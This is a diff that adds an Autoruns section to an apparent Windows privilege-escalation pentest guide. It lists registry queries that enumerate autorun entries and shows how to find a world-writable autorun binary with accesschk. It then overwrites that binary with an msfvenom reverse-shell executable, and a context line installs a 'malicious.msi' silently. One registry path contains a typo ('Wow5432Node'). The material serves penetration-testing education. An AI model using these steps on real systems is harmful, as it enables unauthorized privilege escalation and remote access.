@@ -716,3 +716,79 @@ As this is a reverse shell, you should also run the Metasploit Handler module co
 ```shell-session
 C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
+
+## Autoruns
+
+{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries" %}
+
+Query the registry for AutoRun executables:
+
+```bash
+#CMD
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE
+
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
+reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices
+
+reg query HKLM\Software\Microsoft\Windows\RunOnceEx
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
+reg query HKCU\Software\Microsoft\Windows\RunOnceEx
+reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
+
+#PowerShell
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'
+
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
+
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
+```
+
+Using accesschk.exe, note if one of the AutoRun executables is writable by everyone:
+
+```
+C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+```
+
+Generate a reverse.exe executable with msfvenom and overwrite the AutoRun executable with it:
+
+```
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+```
+
+Start a listener on Kali and then restart the Windows machine
